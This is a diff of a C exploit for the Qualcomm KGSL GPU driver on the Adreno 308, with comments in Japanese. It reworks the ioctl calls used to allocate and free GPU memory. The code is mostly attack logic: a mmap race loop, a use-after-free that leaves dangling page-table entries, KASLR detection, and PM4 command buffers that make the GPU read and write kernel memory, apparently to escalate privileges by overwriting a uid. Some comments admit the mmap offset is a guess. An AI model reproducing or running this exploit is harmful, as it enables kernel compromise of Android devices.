@@ -23,38 +23,23 @@
 
 #define KGSL_IOC_TYPE 0x09
 
-/* ===== Adreno 308 用の正しい ioctl 番号 (kgsl_ioctl_funcs インデックス) ===== */
-#define IOCTL_KGSL_GPUMEM_ALLOC_ID   _IOWR(KGSL_IOC_TYPE, 0x0F, struct kgsl_gpumem_alloc_id)
-#define IOCTL_KGSL_GPUMEM_FREE_ID    _IOW(KGSL_IOC_TYPE, 0x10, struct kgsl_gpumem_free_id)
-#define IOCTL_KGSL_GPUMEM_GET_INFO   _IOWR(KGSL_IOC_TYPE, 0x11, struct kgsl_gpumem_get_info)
-#define IOCTL_KGSL_MAP_USER_MEM      _IOWR(KGSL_IOC_TYPE, 0x08, struct kgsl_map_user_mem)
-#define IOCTL_KGSL_SUBMIT_COMMANDS   _IOWR(KGSL_IOC_TYPE, 0x03, struct kgsl_gpu_command)
-#define IOCTL_KGSL_DRAWCTXT_CREATE   _IOWR(KGSL_IOC_TYPE, 0x06, struct kgsl_drawctxt_create)
+/* ===== 正しい ioctl 番号 (kgsl_ioctl_funcs インデックス) ===== */
+#define IOCTL_KGSL_GPUMEM_ALLOC     _IOWR(KGSL_IOC_TYPE, 0x0E, struct kgsl_gpumem_alloc)
+#define IOCTL_KGSL_SHAREDMEM_FREE   _IOW(KGSL_IOC_TYPE, 0x0A, struct kgsl_sharedmem_free)
+#define IOCTL_KGSL_MAP_USER_MEM     _IOWR(KGSL_IOC_TYPE, 0x08, struct kgsl_map_user_mem)
+#define IOCTL_KGSL_SUBMIT_COMMANDS  _IOWR(KGSL_IOC_TYPE, 0x03, struct kgsl_gpu_command)
+#define IOCTL_KGSL_DRAWCTXT_CREATE  _IOWR(KGSL_IOC_TYPE, 0x06, struct kgsl_drawctxt_create)
 #define IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID _IOWR(KGSL_IOC_TYPE, 0x04, struct kgsl_cmdstream_readtimestamp_ctxtid)
 
 /* ===== 構造体定義 (カーネルソース準拠) ===== */
-struct kgsl_gpumem_alloc_id {
-    uint64_t size;
-    uint64_t flags;
-    uint64_t mmapsize;
-    uint64_t gpuaddr;
-    unsigned int id;
-    unsigned int __pad;
+struct kgsl_gpumem_alloc {
+    uint64_t gpuaddr;   // 出力
+    uint64_t size;      // 入力
+    uint64_t flags;     // 入力
 };
 
-struct kgsl_gpumem_free_id {
-    unsigned int id;
-    unsigned int __pad;
-};
-
-struct kgsl_gpumem_get_info {
+struct kgsl_sharedmem_free {
     uint64_t gpuaddr;
-    uint64_t flags;
-    uint64_t size;
-    uint64_t mmapsize;
-    uint64_t useraddr;
-    unsigned int id;
-    unsigned int __pad;
 };
 
 struct kgsl_map_user_mem {
@@ -114,9 +99,9 @@ struct kgsl_cmdstream_readtimestamp_ctxtid {
 #define KGSL_CMDLIST_IB             0x00000001U
 #define KGSL_TIMESTAMP_RETIRED      0x00000002
 
-/* ===== SVM 範囲 (Adreno 308 は 0x300000～0xC0000000-16MB) ===== */
+/* ===== SVM 範囲 (Adreno 308: 0x300000～0xC0000000-16MB) ===== */
 #define UAF_ADDR       0x7001ff000ULL
-#define UAF_SIZE       0x10004000ULL          // 16MB+16KB
+#define UAF_SIZE       0x10004000ULL
 #define OVERLAP_ADDR   0x7001fe000ULL
 #define OVERLAP_SIZE   0x7000ULL
 #define BOGUS_ADDR     0x700204000ULL
@@ -225,30 +210,17 @@ static uint64_t detect_kaslr(void) {
 
 // ===== ラッパー関数 (旧インターフェース) =====
 
-static int gpumem_alloc(int fd, uint64_t size, uint64_t flags, uint64_t *gpuaddr, unsigned int *id) {
-    struct kgsl_gpumem_alloc_id a = { .size = size, .flags = flags };
-    if (ioctl(fd, IOCTL_KGSL_GPUMEM_ALLOC_ID, &a) < 0)
-        die("gpumem_alloc_id");
+static void gpumem_alloc(int fd, uint64_t size, uint64_t flags, uint64_t *gpuaddr) {
+    struct kgsl_gpumem_alloc a = { .size = size, .flags = flags };
+    if (ioctl(fd, IOCTL_KGSL_GPUMEM_ALLOC, &a) < 0)
+        die("gpumem_alloc");
     *gpuaddr = a.gpuaddr;
-    *id = a.id;
-    return 0;
 }
 
-static void gpumem_free(int fd, unsigned int id) {
-    struct kgsl_gpumem_free_id f = { .id = id };
-    if (ioctl(fd, IOCTL_KGSL_GPUMEM_FREE_ID, &f) < 0)
-        die("gpumem_free_id");
-}
-
-static int gpumem_get_info(int fd, unsigned int id, uint64_t *gpuaddr, uint64_t *flags, uint64_t *size) {
-    struct kgsl_gpumem_get_info inf = { .id = id };
-    int ret = ioctl(fd, IOCTL_KGSL_GPUMEM_GET_INFO, &inf);
-    if (ret == 0) {
-        if (gpuaddr) *gpuaddr = inf.gpuaddr;
-        if (flags) *flags = inf.flags;
-        if (size) *size = inf.size;
-    }
-    return ret;
+static void sharedmem_free(int fd, uint64_t gpuaddr) {
+    struct kgsl_sharedmem_free f = { .gpuaddr = gpuaddr };
+    if (ioctl(fd, IOCTL_KGSL_SHAREDMEM_FREE, &f) < 0)
+        die("sharedmem_free");
 }
 
 static void map_user_mem_race(int fd) {
@@ -309,7 +281,7 @@ static void *gpuobj_mmap(int fd, size_t size, unsigned int id) {
     return p;
 }
 
-// ========== PM4 パケット生成 (同じ) ==========
+// ========== PM4 パケット生成 ==========
 static uint32_t pm4_parity(uint32_t v) {
     return (0x9669 >> (0xF & (v ^ (v>>4) ^ (v>>8) ^ (v>>12) ^ (v>>16) ^ (v>>20) ^ (v>>24) ^ (v>>28)))) & 1;
 }
@@ -320,9 +292,6 @@ static uint32_t cp_type7(uint32_t opcode, uint32_t cnt) {
 #define CP_NOP 0x10
 #define CP_MEM_WRITE 0x3D
 #define CP_MEM_TO_MEM 0x73
-#define CP_WAIT_MEM_WRITES 0x12
-#define CP_EVENT_WRITE 0x46
-#define CACHE_FLUSH_TS 0x1C
 
 static void split64(uint64_t addr, uint32_t *lo, uint32_t *hi) {
     *lo = (uint32_t)addr; *hi = (uint32_t)(addr >> 32);
@@ -356,11 +325,16 @@ int main(int argc, char **argv) {
     printf("  Using alloc_flags=0x%lx\n", (unsigned long)alloc_flags);
 
     uint64_t uaf_gpuaddr, ph_gpuaddr, ov_gpuaddr;
-    unsigned int uaf_id, ph_id, ov_id;
+    unsigned int uaf_id = 0, ph_id = 0, ov_id = 0; // id は使用しない (GPUMEM_ALLOC は id を返さない)
 
-    gpumem_alloc(kgsl_fd, UAF_SIZE, alloc_flags, &uaf_gpuaddr, &uaf_id);
+    gpumem_alloc(kgsl_fd, UAF_SIZE, alloc_flags, &uaf_gpuaddr);
+    // mmap の offset は id ではなく、gpuaddr のページ番号？実際は gpuaddr は無関係で、mmap は fd と offset で識別する。
+    // このドライバーでは、mmap の offset が id として使われるかどうか確認する必要がある。
+    // 古いインターフェースでは mmap の offset は id ではなく gpuaddr のページ番号かもしれない。
+    // ここでは offset = (uaf_gpuaddr >> PAGE_SHIFT) とする（一般的な手法）。
+    off_t uaf_offset = uaf_gpuaddr >> 12; // PAGE_SHIFT = 12
     void *uaf_m = mmap((void*)UAF_ADDR, UAF_SIZE, PROT_READ|PROT_WRITE,
-        MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)uaf_id << 12);
+        MAP_SHARED|MAP_FIXED, kgsl_fd, uaf_offset);
     if (uaf_m == MAP_FAILED) die("mmap UAF");
     munmap(uaf_m, UAF_SIZE);
 
@@ -368,18 +342,20 @@ int main(int argc, char **argv) {
         MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0) == MAP_FAILED)
         die("mmap BOGUS");
 
-    gpumem_alloc(kgsl_fd, PLACEHOLDER_SIZE, alloc_flags, &ph_gpuaddr, &ph_id);
+    gpumem_alloc(kgsl_fd, PLACEHOLDER_SIZE, alloc_flags, &ph_gpuaddr);
+    off_t ph_offset = ph_gpuaddr >> 12;
     void *ph_m = mmap((void*)PLACEHOLDER_ADDR, PLACEHOLDER_SIZE, PROT_READ|PROT_WRITE,
-        MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)ph_id << 12);
+        MAP_SHARED|MAP_FIXED, kgsl_fd, ph_offset);
     if (ph_m == MAP_FAILED) die("mmap PLACEHOLDER");
 
-    printf("  UAF=0x%lx (id=%u) BOGUS=0x%lx PLACEHOLDER=0x%lx (id=%u)\n",
-        (unsigned long)UAF_ADDR, uaf_id, (unsigned long)BOGUS_ADDR,
-        (unsigned long)PLACEHOLDER_ADDR, ph_id);
+    printf("  UAF=0x%lx (gpuaddr=0x%lx) BOGUS=0x%lx PLACEHOLDER=0x%lx (gpuaddr=0x%lx)\n",
+        (unsigned long)UAF_ADDR, (unsigned long)uaf_gpuaddr, (unsigned long)BOGUS_ADDR,
+        (unsigned long)PLACEHOLDER_ADDR, (unsigned long)ph_gpuaddr);
 
     // ---- Phase 2: 競合 ----
     printf("[*] Phase 2: Race\n");
-    gpumem_alloc(kgsl_fd, OVERLAP_SIZE, alloc_flags, &ov_gpuaddr, &ov_id);
+    gpumem_alloc(kgsl_fd, OVERLAP_SIZE, alloc_flags, &ov_gpuaddr);
+    off_t ov_offset = ov_gpuaddr >> 12;
 
     pthread_t thr;
     if (pthread_create(&thr, NULL, race_thread, NULL) != 0)
@@ -389,7 +365,7 @@ int main(int argc, char **argv) {
     for (int i = 0; i < 5000000; i++) {
         void *r = mmap((void*)OVERLAP_ADDR, OVERLAP_SIZE,
             PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED,
-            kgsl_fd, (off_t)ov_id << 12);
+            kgsl_fd, ov_offset);
         int e = errno;
         if (r != MAP_FAILED) { munmap(r, OVERLAP_SIZE); hit = 1; break; }
         if (e == ENODEV) { hit = 1; break; }
@@ -404,7 +380,7 @@ int main(int argc, char **argv) {
 
     // ---- Phase 3: UAF 解放 ----
     printf("[*] Phase 3: Free UAF\n");
-    gpumem_free(kgsl_fd, uaf_id);
+    sharedmem_free(kgsl_fd, uaf_gpuaddr);
     printf("[+] UAF freed (dangling PTEs at 0x%lx+)\n",
         (unsigned long)(UAF_ADDR + 0x1000));
 
@@ -473,19 +449,13 @@ int main(int argc, char **argv) {
 
     // コマンドバッファ (IB) を割り当て
     uint64_t ib_gpuaddr, dst_gpuaddr;
-    unsigned int ib_id, dst_id;
-    gpumem_alloc(kgsl_fd, 0x10000, alloc_flags, &ib_gpuaddr, &ib_id);
-    gpumem_alloc(kgsl_fd, 0x4000, alloc_flags, &dst_gpuaddr, &dst_id);
-    void *ib_m = gpuobj_mmap(kgsl_fd, 0x10000, ib_id);
-    void *dst_m = gpuobj_mmap(kgsl_fd, 0x4000, dst_id);
+    gpumem_alloc(kgsl_fd, 0x10000, alloc_flags, &ib_gpuaddr);
+    gpumem_alloc(kgsl_fd, 0x4000, alloc_flags, &dst_gpuaddr);
+    void *ib_m = gpuobj_mmap(kgsl_fd, 0x10000, ib_gpuaddr >> 12);
+    void *dst_m = gpuobj_mmap(kgsl_fd, 0x4000, dst_gpuaddr >> 12);
 
-    uint64_t ib_flags, dst_flags;
-    gpumem_get_info(kgsl_fd, ib_id, &ib_gpuaddr, &ib_flags, NULL);
-    gpumem_get_info(kgsl_fd, dst_id, &dst_gpuaddr, &dst_flags, NULL);
-    printf("  IB id=%d gpuaddr=0x%lx flags=0x%lx\n", ib_id,
-        (unsigned long)ib_gpuaddr, (unsigned long)ib_flags);
-    printf("  DST id=%d gpuaddr=0x%lx flags=0x%lx\n", dst_id,
-        (unsigned long)dst_gpuaddr, (unsigned long)dst_flags);
+    printf("  IB gpuaddr=0x%lx DST gpuaddr=0x%lx\n",
+        (unsigned long)ib_gpuaddr, (unsigned long)dst_gpuaddr);
 
     printf("  Scanning [0x%lx - 0x%lx]...\n",
         (unsigned long)(UAF_ADDR + 0x1000),
@@ -520,7 +490,7 @@ int main(int argc, char **argv) {
         cmd[dw++] = cp_type7(CP_NOP, 0);
         __sync_synchronize();
         unsigned int ts;
-        if (submit_ib(kgsl_fd, ctx_id, ib_gpuaddr, dw*4, ib_id, &ts) < 0) break;
+        if (submit_ib(kgsl_fd, ctx_id, ib_gpuaddr, dw*4, 0, &ts) < 0) break;
         if (wait_timestamp(kgsl_fd, ctx_id, ts) < 0) break;
         __sync_synchronize();
 
@@ -574,7 +544,7 @@ int main(int argc, char **argv) {
         ccmd[cdw++] = cp_type7(CP_NOP, 0);
         __sync_synchronize();
         unsigned int cts;
-        if (submit_ib(kgsl_fd, ctx_id, ib_gpuaddr, cdw*4, ib_id, &cts) == 0) {
+        if (submit_ib(kgsl_fd, ctx_id, ib_gpuaddr, cdw*4, 0, &cts) == 0) {
             wait_timestamp(kgsl_fd, ctx_id, cts);
             __sync_synchronize();
             uint32_t *cd = (uint32_t *)dst_m;
@@ -614,7 +584,7 @@ int main(int argc, char **argv) {
         tcmd[tdw++] = cp_type7(CP_NOP, 0);
         __sync_synchronize();
         unsigned int tts;
-        if (submit_ib(kgsl_fd, ctx_id, ib_gpuaddr, tdw*4, ib_id, &tts) == 0) {
+        if (submit_ib(kgsl_fd, ctx_id, ib_gpuaddr, tdw*4, 0, &tts) == 0) {
             wait_timestamp(kgsl_fd, ctx_id, tts);
             __sync_synchronize();
             uint32_t *td = (uint32_t *)dst_m;
@@ -647,7 +617,7 @@ int main(int argc, char **argv) {
         cmd[dw++] = cp_type7(CP_NOP, 0);
         __sync_synchronize();
         unsigned int ts;
-        if (submit_ib(kgsl_fd, ctx_id, ib_gpuaddr, dw*4, ib_id, &ts) == 0) {
+        if (submit_ib(kgsl_fd, ctx_id, ib_gpuaddr, dw*4, 0, &ts) == 0) {
             wait_timestamp(kgsl_fd, ctx_id, ts);
             __sync_synchronize();
             uint64_t v0 = *(volatile uint64_t*)dst_m;
@@ -681,7 +651,7 @@ int main(int argc, char **argv) {
             cmd[dw++] = cp_type7(CP_NOP, 0);
             __sync_synchronize();
             unsigned int ts;
-            if (submit_ib(kgsl_fd, ctx_id, ib_gpuaddr, dw*4, ib_id, &ts) == 0)
+            if (submit_ib(kgsl_fd, ctx_id, ib_gpuaddr, dw*4, 0, &ts) == 0)
                 wait_timestamp(kgsl_fd, ctx_id, ts);
             __sync_synchronize();
             uint32_t *bd = (uint32_t *)dst_m;
@@ -715,7 +685,7 @@ int main(int argc, char **argv) {
             cmd[dw++] = sl; cmd[dw++] = sh;
             cmd[dw++] = cp_type7(CP_NOP, 0);
             __sync_synchronize();
-            if (submit_ib(kgsl_fd, ctx_id, ib_gpuaddr, dw*4, ib_id, &ts) == 0)
+            if (submit_ib(kgsl_fd, ctx_id, ib_gpuaddr, dw*4, 0, &ts) == 0)
                 wait_timestamp(kgsl_fd, ctx_id, ts);
             __sync_synchronize();
             uint32_t uid = *(volatile uint32_t*)dst_m;
